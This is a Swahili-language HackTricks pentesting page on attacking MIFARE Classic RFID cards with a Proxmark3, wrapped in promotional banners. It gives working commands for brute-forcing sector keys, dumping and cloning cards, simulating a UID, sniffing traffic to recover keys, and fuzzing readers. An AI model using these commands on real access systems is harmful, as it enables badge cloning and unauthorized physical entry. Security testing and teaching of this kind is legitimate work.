# Proxmark 3

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Kikundi cha Usalama cha Kujitahidi**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Kuvamia Mifumo ya RFID na Proxmark3

Jambo la kwanza unalohitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**kusakinisha programu na mahitaji yake**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Kuvamia MIFARE Classic 1KB

Ina **vikundi 16**, kila kimoja kina **blocki 4** na kila blocki ina **16B**. UID iko kwenye kikundi 0 blocki 0 (na haiwezi kubadilishwa).\
Kupata ufikiaji wa kila kikundi unahitaji **funguo 2** (**A** na **B**) ambazo zimehifadhiwa kwenye **blocki 3 ya kila kikundi** (sehemu ya kikundi). Sehemu ya kikundi pia inahifadhi **vibali vya ufikiaji** vinavyotoa **ruhusa ya kusoma na kuandika** kwenye **kila blocki** kwa kutumia funguo 2.\
Funguo 2 ni muhimu kutoa ruhusa ya kusoma ikiwa unajua ya kwanza na kuandika ikiwa unajua ya pili (kwa mfano).

Mashambulizi kadhaa yanaweza kutekelezwa
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 inaruhusu kutekeleza vitendo vingine kama **kupeleleza** mawasiliano ya **Tag to Reader** kujaribu kupata data nyeti. Kwenye kadi hii unaweza kunusa mawasiliano na kuhesabu funguo zilizotumiwa kwa sababu **shughuli za kryptographi zilizotumiwa ni dhaifu** na kwa kujua maandishi wazi na maandishi ya siri unaweza kuzihesabu (zana ya `mfkey64`).

### Amri za Mbichi

Mifumo ya IoT mara nyingine hutumia vitambulisho visivyo na chapa au visivyo vya kibiashara. Katika kesi hii, unaweza kutumia Proxmark3 kutuma **amri za mbichi kwa vitambulisho**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Kwa habari hii unaweza kujaribu kutafuta habari kuhusu kadi na njia ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri za moja kwa moja kama: `hf 14a raw -p -b 7 26`

### Scripts

Programu ya Proxmark3 inakuja na orodha iliyopakiwa kabla ya **maandishi ya kiotomatiki** unayoweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri ya `script list`. Kisha, tumia amri ya `script run`, ikifuatiwa na jina la maandishi:
```
proxmark3> script run mfkeys
```
Unaweza kuunda script ya **kufanya fuzz tag readers**, kwa kunakili data ya **kadi halali** tu andika **Lua script** ambayo **inabadilisha** moja au zaidi ya **bytes za kubahatisha** na kisha angalia kama **msomaji unaharibika** na mzunguko wowote.

**Kikundi cha Usalama cha Kujaribu Kwa Bidii**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je! Unafanya kazi katika **kampuni ya usalama wa mtandao**? Je! Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
